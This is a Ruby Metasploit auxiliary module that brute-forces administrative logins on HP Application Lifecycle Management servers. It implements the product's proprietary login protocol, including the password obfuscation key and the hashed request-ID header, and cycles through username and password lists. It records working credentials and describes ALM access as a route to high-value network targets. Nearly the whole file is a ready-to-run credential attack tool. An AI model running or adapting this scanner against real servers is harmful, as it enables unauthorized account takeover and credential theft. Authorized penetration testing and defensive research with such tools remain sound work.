##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class HPALM < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            data = getbody(credential.public, obfu(credential.private))
            data = data.gsub(/\n/, "\r\n")
            tdid = hmac(data)

            req = cli.request_cgi({
              'uri' => '/qcbin/servlet/tdservlet/TDAPI_GeneralWebTreatment',
              'method' => 'POST',
              'data' => data,
              'headers' => {
                'X-TD-ID' => tdid.upcase
              },
              'ctype' => 'text/html'
            })

            res = cli.send_recv(req)

            if res && res.body =~ /LOGIN_SESSION_KEY/
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            end

          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end

        def getbody(username, password)
          body =  %Q{\{
0: "0:conststr:Login",
1: \\0000002F\\0:conststr:2BA5C8C9-6E87-46A6-A171-25CF58D2BD44,
2: "0:int:2",
3: "0:int:-1",
4: "0:conststr:",
5: "0:int:-1",
6: \\FFFFFFFF\\0}
          creds = %Q{:conststr:\{
USER_NAME:#{username},
PASSWORD:\\#{password.length.to_s(16).rjust(8, '0')}\\#{password},
CLIENTTYPE:\\0000002a\\Application Lifecycle Management Client UI,
RETRIEVE_ADDITIONAL_INFO:,
OTA_VERSION:12.50,
OTA_BUILD_NUMBER:1287
\}}

          body << creds
          body = body.gsub(/FFFFFFFF/, (creds.length+10).to_s(16).rjust(8,'0').upcase)
body << %Q{
,
7: \\0000001A\\0:conststr:WIN-LIVTQRVJ9B2,
8: "65536:str:0",
9: "0:pint:0",
10: "65536:str:0",
11: "0:pint:0",
12: "0:pint:0"
\}
}

return body.encode('ascii')
        end

        def obfu(password)
          key = 'SmolkaWasHereMonSher'
          password = password.encode('utf-16be')
          obfued_pass = 'OBFUSCATED'
          b = 0
          password.each_char do |c|
            obfued_pass << (c.ord + key[b].ord).to_s
            obfued_pass << '!'
            if b == key.length - 1
              b = 0
            else
              b = b + 1
            end
          end
          return obfued_pass
        end

        def hmac(body)
          return Digest::SHA256.hexdigest('{4947B489-F1D3-40e2-BD95-42851DC75CE6}' + body)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'HP Application Lifecycle Management Admin Bruteforce',
        'Description'    => %q(
        This module attempts to bruteforce administrative credentials on HP Application Lifecycle Management instances.

        HP Application Lifecycle Management is a popular enterprise software suite for managing application and
        software development lifecycles. Privileged access to an ALM instance could yield more information about
        potential high-value targets on the network, as well as network credentials.

        Categories: Enterprise

        Price: 3

        Video: https://asciinema.org/a/edvi4g2xzjqclqlw094nfz8tg

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
      ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 8080,
            'STOP_ON_SUCCESS' => true
        }
    )
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::HPALM.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        uri: datastore['TARGETURI'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
